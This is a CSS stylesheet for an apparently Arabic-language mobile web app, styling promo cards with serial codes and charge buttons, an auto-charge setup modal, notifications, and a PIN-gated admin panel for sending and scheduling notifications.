.auto-toggle-bar{display:flex;align-items:center;justify-content:space-between;background:var(--l1);border:1px solid var(--stroke);border-radius:var(--r-sm);padding:11px 14px;margin-bottom:12px;gap:10px;}
.auto-toggle-info{display:flex;align-items:center;gap:9px;flex:1;}
.auto-toggle-icon{width:34px;height:34px;border-radius:9px;background:rgba(230,0,0,.08);border:1px solid rgba(230,0,0,.15);display:flex;align-items:center;justify-content:center;color:var(--red);font-size:.8rem;flex-shrink:0;}
.auto-toggle-text .at-title{font-size:.72rem;font-weight:800;color:var(--ink);}
.auto-toggle-text .at-sub{font-size:.52rem;color:var(--ink3);margin-top:1px;}
.auto-toggle-text .at-pref{font-size:.55rem;font-weight:700;color:var(--g2);margin-top:3px;display:flex;align-items:center;gap:5px;}
.toggle-switch{position:relative;width:46px;height:26px;flex-shrink:0;}
.toggle-switch input{opacity:0;width:0;height:0;position:absolute;}
.toggle-track{position:absolute;inset:0;border-radius:13px;background:var(--l3);border:1px solid var(--stroke);cursor:pointer;transition:all .3s;}
.toggle-switch input:checked ~ .toggle-track{background:rgba(230,0,0,.25);border-color:rgba(230,0,0,.4);}
.toggle-track::after{content:'';position:absolute;top:3px;right:3px;width:18px;height:18px;border-radius:50%;background:var(--ink3);transition:all .3s cubic-bezier(.34,1.4,.64,1);}
.toggle-switch input:checked ~ .toggle-track::after{right:calc(100% - 21px);background:var(--red);box-shadow:0 0 8px rgba(230,0,0,.5);}

.btn-configure-auto{display:flex;align-items:center;gap:5px;background:rgba(200,168,75,.07);border:1px solid rgba(200,168,75,.2);border-radius:8px;padding:6px 12px;font-family:'Cairo',sans-serif;font-size:.58rem;font-weight:700;color:var(--g2);cursor:pointer;transition:all .2s;white-space:nowrap;}
.btn-configure-auto:hover{background:rgba(200,168,75,.14);border-color:rgba(200,168,75,.35);}
.btn-configure-auto:active{transform:scale(.95);}

.sec-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
.sec-title{font-size:.57rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--ink3);display:flex;align-items:center;gap:7px;}
.sec-line{width:13px;height:2px;border-radius:2px;background:var(--red);}
.sec-badge{font-size:.57rem;font-weight:700;color:var(--ink3);background:var(--l2);border:1px solid var(--stroke);padding:3px 10px;border-radius:100px;}

/* PROMO CARDS */
.promo-card{background:var(--l1);border:1px solid var(--stroke);border-radius:var(--r);margin-bottom:9px;overflow:hidden;animation:cardIn .4s cubic-bezier(.34,1.2,.64,1) both;animation-delay:calc(var(--i,0)*.07s);transition:border-color .2s,transform .2s;}
.promo-card:active{transform:scale(.98);}
.promo-card.best-card{border-color:rgba(200,168,75,.5);box-shadow:0 0 18px rgba(200,168,75,.12);}
@keyframes cardIn{from{opacity:0;transform:translateY(18px) scale(.97)}to{opacity:1;transform:none}}
.card-stripe{height:3px;background:linear-gradient(90deg,var(--red),rgba(230,0,0,.2),transparent);}
.promo-card.best-card .card-stripe{background:linear-gradient(90deg,var(--g3),var(--g2),var(--g3),transparent);}
.card-body{display:flex;align-items:stretch;padding:13px 13px 0;}
.card-chips{display:flex;gap:5px;flex-wrap:wrap;flex:1;align-items:flex-start;}
.chip{display:inline-flex;align-items:center;gap:3px;padding:4px 8px;border-radius:100px;font-size:.56rem;font-weight:700;}
.chip-gold{background:rgba(200,168,75,.07);color:var(--g2);border:1px solid rgba(200,168,75,.14);}
.chip-blue{background:rgba(79,195,247,.06);color:#80ccee;border:1px solid rgba(79,195,247,.11);}
.chip-best{background:linear-gradient(135deg,var(--g3),var(--g1));color:#1a0e00;border:none;}
.chip-auto{background:rgba(230,0,0,.08);color:var(--red);border:1px solid rgba(230,0,0,.2);}
.chip i{font-size:.47rem;}
.card-amount{display:flex;flex-direction:column;align-items:center;justify-content:center;min-width:64px;padding-left:13px;border-left:1px solid var(--stroke);margin-left:13px;}
.amt-num{font-family:'Playfair Display',serif;font-size:1.95rem;font-weight:900;color:var(--ink);line-height:1;}
.amt-cur{font-size:.49rem;font-weight:700;color:var(--ink3);letter-spacing:1px;margin-top:2px;}
.card-serial{display:flex;align-items:center;justify-content:space-between;background:rgba(0,0,0,.25);margin:11px 0 0;padding:9px 13px;border-top:1px solid var(--stroke);gap:8px;}
.serial-val{font-family:'JetBrains Mono',monospace;font-size:.86rem;letter-spacing:2px;color:var(--ink);font-weight:600;flex:1;text-align:right;}
.btn-copy{width:28px;height:28px;border-radius:8px;background:rgba(255,255,255,.04);border:1px solid var(--stroke);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--ink3);transition:all .2s;flex-shrink:0;}
.btn-copy:hover{background:rgba(230,0,0,.1);border-color:rgba(230,0,0,.3);color:var(--red);}
.btn-copy:active{transform:scale(.8);}
.card-btns{display:flex;gap:7px;padding:9px;}
.btn-charge{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;padding:10px 6px;border:none;border-radius:var(--r-sm);background:var(--red);color:#fff;font-family:'Cairo',sans-serif;font-size:.7rem;font-weight:800;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 3px 12px rgba(230,0,0,.24);transition:all .2s;}
.btn-charge::before{content:'';position:absolute;top:0;left:0;right:0;height:50%;background:rgba(255,255,255,.06);}
.btn-charge:hover{background:var(--red3);transform:translateY(-1px);}
.btn-charge:active{transform:scale(.95);}
.btn-charge.done{background:#00a040;box-shadow:0 3px 12px rgba(0,160,64,.25);}
.btn-charge.loading{opacity:.55;pointer-events:none;}
.btn-dial{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;padding:10px 6px;border-radius:var(--r-sm);background:var(--l2);border:1px solid var(--stroke);color:var(--ink2);font-family:'Cairo',sans-serif;font-size:.7rem;font-weight:800;cursor:pointer;text-decoration:none;transition:all .2s;}
.btn-dial:hover{background:var(--l3);color:var(--ink);}
.btn-dial:active{transform:scale(.95);}
.empty-wrap{text-align:center;padding:46px 20px;background:var(--l1);border:1px solid var(--stroke);border-radius:var(--r);}
.empty-wrap i{font-size:2rem;color:var(--ink3);display:block;margin-bottom:10px;}
.empty-wrap p{font-size:.8rem;color:var(--ink2);}
.empty-wrap small{font-size:.6rem;color:var(--ink3);display:block;margin-top:4px;}

/* BOTTOM NAV */
.botnav{position:fixed;bottom:0;left:0;right:0;height:60px;background:rgba(7,7,10,.97);backdrop-filter:blur(22px);border-top:1px solid var(--stroke);display:flex;justify-content:space-around;align-items:stretch;z-index:400;}
.nav-link{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;text-decoration:none;color:var(--ink3);font-family:'Cairo',sans-serif;font-size:.49rem;font-weight:700;letter-spacing:.5px;border-top:2px solid transparent;transition:color .2s,border-color .2s;}
.nav-link:hover{color:var(--g1);border-color:var(--g1);}
.nav-link i{font-size:1.05rem;}

/* TOAST */
.toast{position:fixed;bottom:70px;left:50%;transform:translateX(-50%) translateY(12px);opacity:0;background:rgba(8,8,8,.96);border:1px solid var(--stroke);border-radius:100px;padding:9px 22px;font-family:'Cairo',sans-serif;font-size:.7rem;font-weight:700;color:var(--ink);pointer-events:none;z-index:9998;white-space:nowrap;backdrop-filter:blur(20px);box-shadow:0 8px 28px rgba(0,0,0,.6);transition:all .3s cubic-bezier(.34,1.4,.64,1);}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
.toast.ok{border-color:rgba(0,200,90,.3);color:var(--green);}
.toast.err{border-color:rgba(230,0,0,.3);color:#ff5555;}

/* SLIDE NOTIFICATION */
.notif-slide{position:fixed;top:74px;left:-360px;width:320px;background:rgba(12,12,12,.98);border:1px solid var(--stroke);border-right:3px solid var(--red);border-radius:16px;padding:13px 14px 10px;z-index:9999;backdrop-filter:blur(24px);box-shadow:0 10px 40px rgba(0,0,0,.8);transition:left .45s cubic-bezier(.34,1.15,.64,1);pointer-events:none;}
.notif-slide.show{left:10px;pointer-events:all;}
.notif-slide.has-link{cursor:pointer;}
.notif-top-row{display:flex;align-items:flex-start;gap:11px;}
.notif-slide-icon{width:38px;height:38px;border-radius:10px;background:rgba(230,0,0,.1);border:1px solid rgba(230,0,0,.2);display:flex;align-items:center;justify-content:center;color:var(--red);font-size:.95rem;flex-shrink:0;overflow:hidden;}
.notif-slide-icon img{width:100%;height:100%;object-fit:cover;border-radius:10px;}
.notif-slide-body{flex:1;min-width:0;}
.notif-slide-title{font-size:.68rem;font-weight:800;color:var(--ink);display:flex;align-items:center;justify-content:space-between;gap:6px;margin-bottom:2px;}
.notif-slide-app{font-size:.48rem;color:var(--ink3);font-weight:700;letter-spacing:1px;}
.notif-slide-text{font-size:.62rem;color:var(--ink2);line-height:1.5;word-break:break-word;margin-top:2px;}
.notif-action-btn{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:10px;padding:8px 14px;background:rgba(230,0,0,.09);border:1px solid rgba(230,0,0,.2);border-radius:8px;font-family:'Cairo',sans-serif;font-size:.62rem;font-weight:800;color:var(--red);cursor:pointer;text-decoration:none;transition:all .2s;width:100%;text-align:center;}
.notif-action-btn:hover{background:rgba(230,0,0,.15);}
.notif-bar{position:absolute;bottom:0;left:0;right:0;height:2px;background:rgba(230,0,0,.1);border-radius:0 0 16px 16px;overflow:hidden;}
.notif-bar-fill{height:100%;background:var(--red);width:100%;transform-origin:right;}

/* ══ AUTO-CHARGE SETUP MODAL ══ */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(16px);z-index:5000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s ease;}
.modal-overlay.open{opacity:1;pointer-events:all;}
.modal-sheet{width:100%;max-width:480px;background:var(--l1);border:1px solid var(--stroke2);border-radius:24px 24px 0 0;box-shadow:0 -12px 60px rgba(0,0,0,.9),0 0 0 1px rgba(200,168,75,.05);transform:translateY(100%);transition:transform .4s cubic-bezier(.34,1.1,.64,1);overflow:hidden;}
.modal-overlay.open .modal-sheet{transform:translateY(0);}
.modal-drag{width:38px;height:4px;border-radius:2px;background:rgba(255,255,255,.12);margin:10px auto 0;}
.modal-head{padding:16px 18px 12px;border-bottom:1px solid var(--stroke);background:linear-gradient(180deg,rgba(230,0,0,.06) 0%,transparent 100%);}
.modal-head-row{display:flex;align-items:center;justify-content:space-between;}
.modal-head-left{display:flex;align-items:center;gap:10px;}
.modal-head-icon{width:40px;height:40px;border-radius:11px;background:linear-gradient(135deg,rgba(230,0,0,.15),rgba(230,0,0,.05));border:1px solid rgba(230,0,0,.2);display:flex;align-items:center;justify-content:center;color:var(--red);font-size:.95rem;}
.modal-head-title{font-family:'Playfair Display',serif;font-size:.95rem;font-weight:900;letter-spacing:2px;color:var(--ink);}
.modal-head-sub{font-size:.52rem;color:var(--ink3);margin-top:2px;letter-spacing:1px;}
.modal-close{width:30px;height:30px;border-radius:8px;background:rgba(255,255,255,.04);border:1px solid var(--stroke);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--ink3);font-size:.7rem;transition:all .2s;}
.modal-close:hover{background:rgba(230,0,0,.1);border-color:rgba(230,0,0,.3);color:var(--red);}
.modal-body{padding:16px 18px 30px;overflow-y:auto;max-height:75vh;-webkit-overflow-scrolling:touch;}

/* AMOUNT PICKER */
.section-label{font-size:.54rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--ink3);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
.section-label::after{content:'';flex:1;height:1px;background:var(--stroke);}
.amount-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:18px;}
.amount-tile{position:relative;background:var(--l2);border:1.5px solid var(--stroke);border-radius:14px;padding:14px 8px 10px;text-align:center;cursor:pointer;transition:all .25s cubic-bezier(.34,1.3,.64,1);overflow:hidden;}
.amount-tile::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:transparent;transition:background .25s;}
.amount-tile:hover{border-color:rgba(230,0,0,.25);background:rgba(230,0,0,.04);}
.amount-tile.selected{border-color:rgba(230,0,0,.5);background:rgba(230,0,0,.07);box-shadow:0 0 16px rgba(230,0,0,.1);}
.amount-tile.selected::before{background:var(--red);}
.amount-tile.best-tile{border-color:rgba(200,168,75,.3);}
.amount-tile.best-tile.selected{border-color:rgba(200,168,75,.7);background:rgba(200,168,75,.07);box-shadow:0 0 16px rgba(200,168,75,.12);}
.amount-tile.best-tile.selected::before{background:var(--g1);}
.amount-tile.best-tile::before{background:rgba(200,168,75,.3);}
.tile-badge{position:absolute;top:5px;right:5px;font-size:.42rem;font-weight:800;padding:2px 6px;border-radius:100px;background:linear-gradient(135deg,var(--g3),var(--g1));color:#1a0e00;letter-spacing:.5px;}
.tile-num{font-family:'Playfair Display',serif;font-size:1.6rem;font-weight:900;color:var(--ink);line-height:1;}
.amount-tile.selected .tile-num{color:var(--red);}
.amount-tile.best-tile.selected .tile-num{color:var(--g2);}
.tile-cur{font-size:.5rem;font-weight:700;color:var(--ink3);margin-top:1px;}
.tile-gift{display:flex;align-items:center;justify-content:center;gap:3px;font-size:.5rem;font-weight:700;color:var(--ink3);margin-top:5px;padding:3px 6px;background:rgba(255,255,255,.04);border-radius:100px;}
.amount-tile.selected .tile-gift{color:var(--red);background:rgba(230,0,0,.08);}
.amount-tile.best-tile.selected .tile-gift{color:var(--g2);background:rgba(200,168,75,.08);}
.tile-check{position:absolute;bottom:5px;left:5px;width:14px;height:14px;border-radius:50%;background:var(--red);display:flex;align-items:center;justify-content:center;opacity:0;transform:scale(0);transition:all .2s cubic-bezier(.34,1.5,.64,1);}
.amount-tile.selected .tile-check{opacity:1;transform:scale(1);}
.amount-tile.best-tile.selected .tile-check{background:var(--g1);}
.tile-check i{font-size:.45rem;color:#fff;}

/* METHOD PICKER */
.method-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;}
.method-tile{background:var(--l2);border:1.5px solid var(--stroke);border-radius:14px;padding:16px 12px;text-align:center;cursor:pointer;transition:all .25s cubic-bezier(.34,1.3,.64,1);position:relative;overflow:hidden;}
.method-tile::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:transparent;transition:background .25s;}
.method-tile:hover{border-color:rgba(200,168,75,.25);}
.method-tile.selected{border-color:rgba(200,168,75,.55);background:rgba(200,168,75,.05);box-shadow:0 0 20px rgba(200,168,75,.1);}
.method-tile.selected::before{background:var(--g1);}
.method-icon{width:44px;height:44px;border-radius:12px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem;border:1px solid var(--stroke);background:var(--l3);transition:all .25s;}
.method-tile.selected .method-icon{border-color:rgba(200,168,75,.3);background:rgba(200,168,75,.08);}
.method-tile:first-child .method-icon{color:var(--red);}
.method-tile:last-child .method-icon{color:#4fc3f7;}
.method-tile.selected:first-child .method-icon{color:var(--red);}
.method-tile.selected:last-child .method-icon{color:#4fc3f7;}
.method-label{font-size:.72rem;font-weight:800;color:var(--ink);margin-bottom:3px;}
.method-sub{font-size:.54rem;color:var(--ink3);line-height:1.4;}
.method-tile.selected .method-label{color:var(--g2);}
.method-check{position:absolute;top:8px;left:8px;width:16px;height:16px;border-radius:50%;background:var(--g1);display:flex;align-items:center;justify-content:center;opacity:0;transform:scale(0);transition:all .2s cubic-bezier(.34,1.5,.64,1);}
.method-tile.selected .method-check{opacity:1;transform:scale(1);}
.method-check i{font-size:.5rem;color:#1a0e00;}

/* SUMMARY BOX */
.summary-box{background:var(--l2);border:1px solid var(--stroke2);border-radius:14px;padding:13px 15px;margin-bottom:18px;display:flex;align-items:center;gap:12px;}
.sum-icon{width:38px;height:38px;border-radius:10px;background:rgba(230,0,0,.08);border:1px solid rgba(230,0,0,.15);display:flex;align-items:center;justify-content:center;color:var(--red);font-size:.85rem;flex-shrink:0;}
.sum-text{flex:1;}
.sum-main{font-size:.72rem;font-weight:800;color:var(--ink);}
.sum-main span{color:var(--g2);}
.sum-sub{font-size:.56rem;color:var(--ink3);margin-top:2px;}
.sum-empty{font-size:.65rem;font-weight:700;color:var(--ink3);}

/* CONFIRM BTN */
.btn-confirm-auto{width:100%;padding:15px;border:none;border-radius:var(--r-sm);background:linear-gradient(135deg,var(--red2),var(--red),var(--red3));color:#fff;font-family:'Cairo',sans-serif;font-size:.88rem;font-weight:900;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 5px 24px rgba(230,0,0,.3);transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;}
.btn-confirm-auto::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.1) 0%,transparent 55%);}
.btn-confirm-auto:hover{transform:translateY(-1px);box-shadow:0 9px 32px rgba(230,0,0,.4);}
.btn-confirm-auto:active{transform:scale(.97);}
.btn-confirm-auto:disabled{opacity:.4;cursor:not-allowed;transform:none;}

/* ADMIN OVERLAY */
.admin-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(18px);z-index:10000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s ease;}
.admin-overlay.open{opacity:1;pointer-events:all;}
.admin-panel{width:100%;max-width:460px;background:var(--l1);border:1px solid var(--stroke);border-radius:22px 22px 0 0;box-shadow:0 -10px 60px rgba(0,0,0,.9);transform:translateY(100%);transition:transform .38s cubic-bezier(.34,1.1,.64,1);display:flex;flex-direction:column;height:92vh;max-height:92vh;overflow:hidden;}
.admin-overlay.open .admin-panel{transform:translateY(0);}
.admin-drag-bar{width:40px;height:4px;border-radius:2px;background:rgba(255,255,255,.15);margin:10px auto 0;flex-shrink:0;}
.admin-head{background:linear-gradient(135deg,rgba(230,0,0,.12),transparent);border-bottom:1px solid var(--stroke);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
.admin-head-left{display:flex;align-items:center;gap:11px;}
.admin-head-icon{width:38px;height:38px;border-radius:10px;background:rgba(230,0,0,.1);border:1px solid rgba(230,0,0,.2);display:flex;align-items:center;justify-content:center;color:var(--red);font-size:.9rem;}
.admin-head-title{font-family:'Playfair Display',serif;font-size:.88rem;font-weight:900;letter-spacing:2px;color:var(--ink);}
.admin-head-sub{font-size:.52rem;color:var(--ink3);margin-top:2px;letter-spacing:1px;}
.admin-close{width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,.04);border:1px solid var(--stroke);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--ink3);font-size:.7rem;transition:all .2s;}
.admin-close:hover{background:rgba(230,0,0,.1);border-color:rgba(230,0,0,.3);color:var(--red);}
.admin-auth{padding:22px 20px;overflow-y:auto;-webkit-overflow-scrolling:touch;flex:1;}
.admin-auth-title{font-size:.65rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--ink3);text-align:center;margin-bottom:16px;}
.pin-dots{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px;}
.pin-dot{width:12px;height:12px;border-radius:50%;background:var(--l3);border:1.5px solid var(--stroke);transition:all .2s;}
.pin-dot.filled{background:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(230,0,0,.5);}
.pin-dot.err{background:#ff4444;border-color:#ff4444;animation:shake .3s ease;}
.pw-field-wrap{background:var(--l2);border:1.5px solid var(--stroke);border-radius:var(--r-sm);display:flex;align-items:center;margin-bottom:13px;transition:border-color .25s;}
.pw-field-wrap:focus-within{border-color:rgba(230,0,0,.35);}
.pw-field-wrap input{flex:1;background:none;border:none;outline:none;font-family:'Cairo',sans-serif;font-size:.88rem;font-weight:700;color:var(--ink);padding:13px 14px;direction:ltr;letter-spacing:2px;text-align:center;}
.pw-field-wrap .ico{width:40px;text-align:center;color:var(--ink3);font-size:.75rem;flex-shrink:0;}
.btn-auth{width:100%;padding:13px;border:none;border-radius:var(--r-sm);background:linear-gradient(135deg,var(--g3),var(--g1),var(--g2));color:#1a0e00;font-family:'Cairo',sans-serif;font-size:.85rem;font-weight:900;cursor:pointer;transition:all .2s;box-shadow:0 4px 16px rgba(200,168,75,.25);}
.btn-auth:hover{transform:translateY(-1px);}
.btn-auth:active{transform:scale(.97);}
.auth-err{font-size:.65rem;font-weight:700;color:#ff5555;text-align:center;margin-bottom:10px;opacity:0;transition:opacity .2s;}
.auth-err.show{opacity:1;}
.admin-content{padding:0;display:none;overflow-y:auto;-webkit-overflow-scrolling:touch;flex:1;flex-direction:column;}
.admin-content.visible{display:flex;}
.admin-tabs{display:flex;border-bottom:1px solid var(--stroke);flex-shrink:0;}
.admin-tab{flex:1;padding:10px 6px;text-align:center;font-family:'Cairo',sans-serif;font-size:.58rem;font-weight:700;color:var(--ink3);cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;}
.admin-tab.active{color:var(--red);border-bottom-color:var(--red);}
.admin-tab-body{padding:16px 18px 40px;overflow-y:auto;-webkit-overflow-scrolling:touch;}
.admin-field{margin-bottom:14px;}
.admin-label{font-size:.54rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--ink3);margin-bottom:7px;display:block;}
.admin-textarea{width:100%;background:var(--l2);border:1.5px solid var(--stroke);border-radius:var(--r-sm);padding:12px 14px;resize:none;font-family:'Cairo',sans-serif;font-size:.82rem;font-weight:700;color:var(--ink);direction:rtl;outline:none;line-height:1.6;transition:border-color .25s;}
.admin-textarea:focus{border-color:rgba(230,0,0,.35);}
.admin-textarea::placeholder{color:var(--ink3);}
.admin-input{width:100%;background:var(--l2);border:1.5px solid var(--stroke);border-radius:var(--r-sm);padding:11px 14px;font-family:'Cairo',sans-serif;font-size:.82rem;font-weight:700;color:var(--ink);direction:rtl;outline:none;transition:border-color .25s;}
.admin-input:focus{border-color:rgba(230,0,0,.35);}
.admin-input::placeholder{color:var(--ink3);}
input[type="datetime-local"]{color-scheme:dark;}
.admin-type-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px;margin-bottom:14px;}
.type-btn{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;padding:10px 6px;border-radius:var(--r-sm);background:var(--l2);border:1.5px solid var(--stroke);cursor:pointer;transition:all .2s;font-family:'Cairo',sans-serif;font-size:.56rem;font-weight:700;color:var(--ink3);}
.type-btn i{font-size:.85rem;}
.type-btn.active-info{background:rgba(79,195,247,.07);border-color:rgba(79,195,247,.3);color:#80ccee;}
.type-btn.active-ok{background:rgba(0,200,90,.07);border-color:rgba(0,200,90,.3);color:var(--green);}
.type-btn.active-err{background:rgba(230,0,0,.07);border-color:rgba(230,0,0,.3);color:#ff8888;}
.admin-dur-grid{display:flex;gap:6px;flex-wrap:wrap;}
.dur-btn{flex:1;min-width:42px;padding:8px 4px;text-align:center;background:var(--l2);border:1.5px solid var(--stroke);border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-size:.62rem;font-weight:700;color:var(--ink3);transition:all .2s;}
.dur-btn:hover{border-color:rgba(230,0,0,.3);color:var(--ink);}
.dur-btn.active{background:rgba(230,0,0,.08);border-color:rgba(230,0,0,.35);color:var(--red);}
.admin-sep{font-size:.5rem;font-weight:700;letter-spacing:2px;color:var(--ink3);display:flex;align-items:center;gap:8px;text-transform:uppercase;margin:14px 0;}
.admin-sep::before,.admin-sep::after{content:'';flex:1;height:1px;background:var(--stroke);}
.admin-btns{display:flex;gap:8px;margin-top:4px;}
.btn-send-notif{flex:1;padding:13px;border:none;border-radius:var(--r-sm);background:linear-gradient(135deg,var(--red2),var(--red),var(--red3));color:#fff;font-family:'Cairo',sans-serif;font-size:.78rem;font-weight:800;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:6px;box-shadow:0 4px 16px rgba(230,0,0,.25);}
.btn-send-notif:hover{transform:translateY(-1px);}
.btn-send-notif:active{transform:scale(.95);}
.btn-clear-notif{padding:13px 16px;border-radius:var(--r-sm);background:var(--l2);border:1px solid var(--stroke);color:var(--ink3);cursor:pointer;transition:all .2s;font-family:'Cairo',sans-serif;font-size:.7rem;font-weight:700;}
.btn-clear-notif:hover{border-color:rgba(230,0,0,.35);color:var(--red);}
.admin-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-top:14px;padding-top:14px;border-top:1px solid var(--stroke);}
.adm-stat{background:var(--l2);border:1px solid var(--stroke);border-radius:10px;padding:10px 12px;text-align:center;}
.adm-stat-val{font-family:'Playfair Display',serif;font-size:1.1rem;font-weight:900;color:var(--red);}
.adm-stat-lbl{font-size:.5rem;color:var(--ink3);margin-top:3px;letter-spacing:.5px;}
.notif-preview{background:var(--l2);border:1px solid var(--stroke);border-radius:10px;padding:11px 13px;display:flex;align-items:flex-start;gap:9px;border-right:3px solid var(--red);transition:border-color .2s;}
.notif-preview.type-ok{border-right-color:var(--green);}
.notif-preview.type-err{border-right-color:#ff5555;}
.prev-icon{width:28px;height:28px;border-radius:7px;background:rgba(230,0,0,.1);display:flex;align-items:center;justify-content:center;color:var(--red);font-size:.7rem;flex-shrink:0;transition:all .2s;}
.notif-preview.type-ok .prev-icon{background:rgba(0,200,90,.1);color:var(--green);}
.notif-preview.type-err .prev-icon{background:rgba(255,85,85,.1);color:#ff5555;}
.prev-app{font-size:.48rem;color:var(--ink3);margin-bottom:4px;}
.prev-title{font-size:.65rem;font-weight:800;color:var(--ink);margin-bottom:2px;}
.prev-text{font-size:.6rem;color:var(--ink2);line-height:1.4;}
.hist-list,.sched-list{display:flex;flex-direction:column;gap:8px;}
.hist-item,.sched-item{background:var(--l2);border:1px solid var(--stroke);border-radius:10px;padding:10px 12px;display:flex;align-items:flex-start;justify-content:space-between;gap:8px;position:relative;overflow:hidden;}
.hist-item::before,.sched-item::before{content:'';position:absolute;top:0;right:0;bottom:0;width:3px;}
.hist-item.type-info::before,.sched-item.type-info::before{background:var(--red);}
.hist-item.type-ok::before,.sched-item.type-ok::before{background:var(--green);}
.hist-item.type-err::before,.sched-item.type-err::before{background:#ff5555;}
.sched-item.done-item{opacity:.45;}
.hist-item-body,.sched-item-body{flex:1;min-width:0;}
.hist-item-title,.sched-item-title{font-size:.65rem;font-weight:800;color:var(--ink);margin-bottom:2px;}
.hist-item-text,.sched-item-text{font-size:.58rem;color:var(--ink2);line-height:1.4;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.hist-item-meta{display:flex;align-items:center;gap:6px;margin-top:5px;}
.hist-meta-chip{display:inline-flex;align-items:center;gap:3px;font-size:.5rem;font-weight:700;padding:2px 7px;border-radius:100px;}
.hist-meta-time{background:rgba(255,255,255,.05);color:var(--ink3);}
.hist-meta-views{background:rgba(200,168,75,.07);color:var(--g2);}
.hist-resend{width:28px;height:28px;border-radius:8px;flex-shrink:0;background:rgba(230,0,0,.07);border:1px solid rgba(230,0,0,.15);display:flex;align-items:center;justify-content:middle;cursor:pointer;color:var(--red);font-size:.6rem;transition:all .2s;}
.hist-resend:hover{background:rgba(230,0,0,.15);}
.sched-del{width:26px;height:26px;border-radius:7px;flex-shrink:0;background:rgba(255,85,85,.07);border:1px solid rgba(255,85,85,.15);display:flex;align-items:center;justify-content:center;cursor:pointer;color:#ff5555;font-size:.58rem;transition:all .2s;}
.sched-del:hover{background:rgba(255,85,85,.18);}
.sched-time-badge{display:inline-flex;align-items:center;gap:4px;font-size:.5rem;font-weight:700;margin-top:5px;padding:2px 8px;border-radius:100px;background:rgba(200,168,75,.07);color:var(--g2);}
.sched-time-badge.done-badge{background:rgba(0,200,90,.07);color:var(--green);}
.hist-empty{text-align:center;padding:24px;color:var(--ink3);font-size:.65rem;}
::-webkit-scrollbar{width:3px;}::-webkit-scrollbar-track{background:var(--l1);}::-webkit-scrollbar-thumb{background:rgba(230,0,0,.3);border-radius:3px;}

/* UNITS PICKER */
.units-section{margin-bottom:18px;}
.units-display-row{display:flex;align-items:center;justify-content:center;gap:0;margin-bottom:14px;}
.units-btn{width:44px;height:44px;border-radius:12px;border:1.5px solid var(--stroke);background:var(--l2);color:var(--ink2);font-size:1.1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .2s cubic-bezier(.34,1.4,.64,1);flex-shrink:0;}
.units-btn:hover{border-color:rgba(230,0,0,.35);background:rgba(230,0,0,.07);color:var(--red);}
.units-btn:active{transform:scale(.88);}
.units-val-wrap{flex:1;text-align:center;padding:0 10px;}
.units-num{font-family:'Playfair Display',serif;font-size:3rem;font-weight:900;color:var(--ink);line-height:1;transition:color .2s;}
.units-num.changed{color:var(--red);animation:unitPop .3s cubic-bezier(.34,1.6,.64,1);}
@keyframes unitPop{0%{transform:scale(.8)}100%{transform:scale(1)}}
.units-label{font-size:.55rem;font-weight:700;color:var(--ink3);letter-spacing:1.5px;margin-top:3px;}
.units-presets{display:flex;gap:6px;flex-wrap:wrap;justify-content:center;margin-bottom:10px;}
.unit-preset{padding:6px 14px;border-radius:100px;background:var(--l2);border:1.5px solid var(--stroke);font-family:'Cairo',sans-serif;font-size:.6rem;font-weight:800;color:var(--ink3);cursor:pointer;transition:all .2s;}
.unit-preset:hover{border-color:rgba(200,168,75,.3);color:var(--g2);}
.unit-preset.active{background:rgba(200,168,75,.08);border-color:rgba(200,168,75,.5);color:var(--g2);}
.unit-preset.max-preset{border-color:rgba(230,0,0,.25);color:var(--red);background:rgba(230,0,0,.05);}
.unit-preset.max-preset.active{background:rgba(230,0,0,.1);border-color:rgba(230,0,0,.5);}
.units-slider-wrap{padding:0 4px;}
.units-slider{-webkit-appearance:none;appearance:none;width:100%;height:4px;border-radius:2px;background:var(--l3);outline:none;cursor:pointer;}
.units-slider::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,var(--red2),var(--red));border:2px solid rgba(255,80,80,.3);cursor:pointer;box-shadow:0 0 10px rgba(230,0,0,.4);transition:transform .15s,box-shadow .15s;}
.units-slider::-webkit-slider-thumb:hover{transform:scale(1.2);box-shadow:0 0 16px rgba(230,0,0,.6);}
